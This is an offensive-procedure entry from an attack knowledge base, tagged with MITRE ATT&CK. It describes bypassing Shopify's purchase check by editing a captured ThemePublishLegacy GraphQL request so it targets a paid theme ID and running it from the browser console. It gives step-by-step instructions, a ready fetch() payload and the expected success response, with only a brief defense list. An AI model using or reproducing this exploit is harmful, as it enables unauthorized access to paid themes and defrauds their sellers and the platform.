---
id: proc-shopify-modify-publish-mutation-927567
tags:
  - shopify
  - graphql
  - mutation-abuse
  - bypass
type: procedure
tools:
  - '[[tools/Browser-Developer-Tools]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/theme-publish-graphql-mutation]]'
verified: false
platforms:
  - Web
  - Shopify
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:29:29.088Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Modify-and-Execute-Paid-Theme-Publish-Mutation

## Summary

This procedure modifies a captured GraphQL publish request to target a paid theme ID and executes it via browser console, exploiting insufficient authorization to publish without purchase.

## Description

Using the fetched request from free theme publication, replace the variables.id with the paid theme's GraphQL ID (gid://shopify/OnlineStoreTheme/[PAID_THEME_ID]). Execute in the console against the same endpoint, bypassing purchase verification due to missing checks in ThemePublishLegacy. Requires prior capture and ID extraction; results in unauthorized publication and access.

## Requirements

1. Captured fetch code from free theme publish
2. Extracted paid theme ID
3. Open browser console in Shopify admin context

## Defense

Defensive measures and detection strategies:

- Add purchase status validation in ThemePublishLegacy mutation
- Log and block mutations targeting unpaid themes
- Implement session-based authorization for theme operations

## Objectives

1. Alter mutation to publish paid theme illicitly
2. Execute request to gain unauthorized access
3. Confirm success via API response

## Instructions

### Step 1: Paste Captured Fetch

**Context**: Load the base request into console.

Paste the copied fetch code into DevTools Console.

> Code includes body with operationName: ThemePublishLegacy.

### Step 2: Replace Theme ID

**Context**: Target the paid theme by updating variables.

Edit the body JSON: change \"id\":\"gid://shopify/OnlineStoreTheme/[FREE_ID]\" to [PAID_ID].

> Ensure credentials: include for session auth.

### Step 3: Execute Modified Request

**Context**: Run the [[commands/theme-publish-graphql-mutation]] to publish.

Execute [[commands/theme-publish-graphql-mutation]]:

```javascript
fetch("https://yourshop.myshopify.com/admin/online-store/admin/api/unversioned/graphql", {
  "headers": {
    "accept": "application/json",
    "content-type": "application/json",
    "x-online-store-web": "1"
  },
  "body": "{\"operationName\":\"ThemePublishLegacy\",\"variables\":{\"id\":\"gid://shopify/OnlineStoreTheme/[PAID_THEME_ID]\"},\"query\":\"mutation ThemePublishLegacy($id: ID!) { onlineStoreThemePublish(id: $id) { theme { id __typename } userErrors { field message __typename } __typename } }\"}",
  "method": "POST",
  "credentials": "include"
});"
```

> Response: { data: { onlineStoreThemePublish: { theme: { id: ... }, userErrors: [] } } } on success.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/theme-publish-graphql-mutation]]

## Tools Used

- [[tools/Browser-Developer-Tools]]

## Tags

- shopify
- graphql
- mutation-abuse
- bypass
